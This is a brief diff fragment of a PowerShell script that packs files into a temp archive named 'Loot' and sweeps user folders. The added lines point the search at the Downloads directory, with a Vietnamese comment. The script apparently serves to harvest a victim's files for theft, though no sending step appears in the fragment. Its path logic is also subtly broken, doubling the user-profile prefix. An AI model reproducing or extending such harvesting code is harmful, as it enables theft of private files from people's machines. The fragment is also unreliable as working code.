@@ -62,6 +62,8 @@ $currentZipSize = 0
 $index = 1
 $zipFilePath ="$env:temp/Loot$index.zip"
 
+#Neu kh co duong dan thi se quet het
+$Path = "$env:USERPROFILE\DownLoads"
 If($Path -ne $null){
 $foldersToSearch = "$env:USERPROFILE\"+$Path
 }else{
